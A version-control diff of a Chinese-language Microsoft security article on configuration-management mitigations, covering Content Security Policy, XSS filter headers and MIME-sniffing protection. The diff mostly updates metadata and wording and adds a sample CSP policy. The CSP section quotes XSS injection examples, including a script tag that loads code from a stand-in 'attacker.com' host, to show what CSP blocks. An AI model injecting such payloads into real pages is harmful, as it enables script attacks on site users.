@@ -1,10 +1,10 @@
 ---
-title: Microsoft Threat Modeling Tool 的配置管理
+title: 为 Microsoft Threat Modeling Tool 配置管理
 titleSuffix: Azure
-description: 针对威胁建模工具中暴露的威胁采取的缓解措施
+description: 了解 Threat Modeling Tool 的配置管理。 请参阅缓解措施信息并查看代码示例。
 services: security
 documentationcenter: na
-author: jegeib
+author: Johnnytechn
 manager: jegeib
 editor: jegeib
 ms.assetid: na
@@ -14,18 +14,18 @@ ms.workload: na
 ms.tgt_pltfrm: na
 ms.devlang: na
 ms.topic: article
-ms.date: 06/03/2020
-ms.author: v-tawe
+ms.date: 10/12/2020
+ms.author: v-johya
 origin.date: 02/07/2017
-ms.openlocfilehash: 434c83a3e7eaa940d89f904251fe5b47c77dae0a
-ms.sourcegitcommit: 79c99a9ea013b3c74706a1038a505f4eea2aaac4
+ms.openlocfilehash: e51d143850d5d73ed36d0a1c1b803053ed23a3c5
+ms.sourcegitcommit: 6f66215d61c6c4ee3f2713a796e074f69934ba98
 ms.translationtype: HT
 ms.contentlocale: zh-CN
-ms.lasthandoff: 06/05/2020
-ms.locfileid: "84439570"
+ms.lasthandoff: 10/16/2020
+ms.locfileid: "92128146"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>安全框架：配置管理 | 缓解措施 
-| 产品/服务 | 文章 |
+| 产品/服务 | 项目 |
 | --------------- | ------- |
 | **Web 应用程序** | <ul><li>[实施内容安全策略 (CSP) 并禁用内联 JavaScript](#csp-js)</li><li>[启用浏览器的 XSS 筛选器](#xss-filter)</li><li>[ASP.NET 应用程序在部署之前必须禁用跟踪和调试](#trace-deploy)</li><li>[仅从受信任源访问第三方 JavaScript](#js-trusted)</li><li>[确保在经过身份验证的 ASP.NET 页面中整合 UI 伪装或点击劫持防御机制](#ui-defenses)</li><li>[确保已在 ASP.NET Web 应用程序中启用 CORS 的情况下只允许受信任的来源](#cors-aspnet)</li><li>[在 ASP.NET 页面中启用 ValidateRequest 特性](#validate-aspnet)</li><li>[使用本地托管的最新版本的 JavaScript 库](#local-js)</li><li>[禁用自动 MIME 探查](#mime-sniff)</li><li>[在 Windows Azure 网站中删除标准服务器标头避免留下指纹](#standard-finger)</li></ul> |
 | **Database** | <ul><li>[为数据库引擎访问配置 Windows 防火墙](#firewall-db)</li></ul> |
@@ -46,8 +46,15 @@ ms.locfileid: "84439570"
 | **适用的技术** | 泛型 |
 | **属性**              | 空值  |
 | **参考**              | [内容安全策略参考](https://content-security-policy.com/)、[安全功能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[内容安全策略简介](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[是否可以使用 CSP？](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 它是基于允许列表的策略 - 网站可以声明一组受信任的域，而通过这些域可以加载 JavaScript 等活动内容。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 由于云解决方案提供商采用 Base Restriction-1，因此这种攻击不起作用</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 由于攻击者控制的域不会出现在云解决方案提供商的域允许列表中，因此这种攻击不起作用</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为，目标域不会出现在云解决方案提供商的允许列表中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
+| **步骤** | <p>内容安全策略 (CSP) 是一种深度防护安全机制，也是一项 W3C 标准，可让 Web 应用程序所有者控制其站点中嵌入的内容。 CSP 以 HTTP 响应标头的形式添加在 Web 服务器上，由浏览器在客户端实施。 它是基于允许列表的策略 - 网站可以声明一组受信任的域，通过这些域可以加载 JavaScript 之类的活动内容。</p><p>CSP 提供以下安全优势：</p><ul><li>**XSS 防护：** 如果页面容易受到 XSS 攻击，攻击者可通过两种方式利用这种漏洞：<ul><li>注入 `<script>malicious code</script>`。 由于 CSP 采用 Base Restriction-1，因此这种攻击不起作用</li><li>注入 `<script src="http://attacker.com/maliciousCode.js"/>`。 由于攻击者控制的域不会出现在 CSP 的域允许列表中，因此这种攻击不起作用</li></ul></li><li>**控制数据渗透：** 如果网页中的任何恶意内容尝试连接到外部网站并窃取数据，CSP 将中止该连接。 这是因为，目标域不会出现在 CSP 的允许列表中</li><li>**防范点击劫持：** 点击劫持是一种攻击技法，攻击者布设一个正规的网站，诱迫用户点击其中的 UI 元素。 目前，针对点击劫持的防范措施是通过配置 响应标头 X-Frame-Options 实现的。 并非所有浏览器都支持此标头，从趋势来看，CSP 是防范点击劫持的标准方式。</li><li>**实时攻击报告：** 如果启用 CSP 的网站上发生注入攻击，浏览器会自动向 Web 服务器上配置的终结点触发通知。 这样，CSP 便充当了实时警告系统。</li></ul> |
 
+<!--not avaiable in China: https://www.html5rocks.com/en/tutorials/security/content-security-policy/-->
+### <a name="example"></a>示例
+示例策略： 
+```csharp
+Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analytics.com 
+```
+此策略只允许从 Web 应用程序的服务器和 google 分析服务器加载脚本。 从其他任何站点加载的脚本会被拒绝。 在网站上启用 CSP 后，以下功能会自动禁用以缓解 XSS 攻击。 
 
 ### <a name="example"></a>示例
 内联脚本不会执行。 下面是内联脚本的示例 
@@ -72,7 +79,7 @@ Example: var str="alert(1)"; eval(str);
 | **适用的技术** | 泛型 |
 | **属性**              | 空值  |
 | **参考**              | [XSS 保护筛选器](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) |
-| **步骤** | <p>X-XSS-Protection 响应标头配置控制浏览器的跨站点脚本筛选器。 此响应标头可使用以下值：</p><ul><li>`0:`：禁用筛选器</li><li>`1: Filter enabled`：如果检测到跨站点脚本攻击，浏览器将净化页面以阻止攻击</li><li>`1: mode=block : Filter enabled`。 检测到 XSS 攻击时，浏览器将阻止呈现页面，而不是净化页面</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`。 浏览器将净化页面并报告违规。</li></ul><p>这是一个 Chromium 函数，它利用 CSP 违规报告将详细信息发送到所选的 URI。 最后 2 个选项被视为安全值。</p>|
+| **步骤** | <p>X-XSS-Protection 响应标头配置控制浏览器的跨站点脚本筛选器。 此响应标头可使用以下值：</p><ul><li>`0:`：禁用筛选器</li><li>`1: Filter enabled`：如果检测到跨站点脚本攻击，浏览器将净化页面以阻止攻击</li><li>`1: mode=block : Filter enabled`. 检测到 XSS 攻击时，浏览器将阻止呈现页面，而不是净化页面</li><li>`1: report=http://[YOURDOMAIN]/your_report_URI : Filter enabled`. 浏览器将净化页面并报告违规。</li></ul><p>这是一个 Chromium 函数，它利用 CSP 违规报告将详细信息发送到所选的 URI。 最后 2 个选项被视为安全值。</p>|
 
 ## <a name="aspnet-applications-must-disable-tracing-and-debugging-prior-to-deployment"></a><a id="trace-deploy"></a>ASP.NET 应用程序在部署之前必须禁用跟踪和调试
 
@@ -207,7 +214,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 | **SDL 阶段**               | 构建 |  
 | **适用的技术** | 泛型 |
 | **属性**              | 空值  |
-| **参考**              | [IE8 安全性第五部分：全面保护](https://blogs.msdn.com/ie/archive/2008/07/02/ie8-security-part-v-comprehensive-protection.aspx)、MIME 类型|
+| **参考**              | [IE8 安全性第五部分：全面保护](https://docs.microsoft.com/archive/blogs/ie/ie8-security-part-v-comprehensive-protection)、MIME 类型|
 | **步骤** | X-Content-Type-Options 标头是一个 HTTP 标头，可让开发人员指定不应该对其内容使用 MIME 探查。 此标头旨在缓解 MIME 探查攻击。 对于可能包含用户可控内容的每个页面，必须使用 HTTP 标头 X-Content-Type-Options:nosniff。 若要针对应用程序中的所有页面全局启用所需的标头，可执行以下操作之一|
 
 ### <a name="example"></a>示例
@@ -647,3 +654,4 @@ smb.HttpGetEnabled = false;
 smb.HttpGetUrl = new Uri(EndPointAddress); 
 Host.Description.Behaviors.Add(smb);
 ```
+
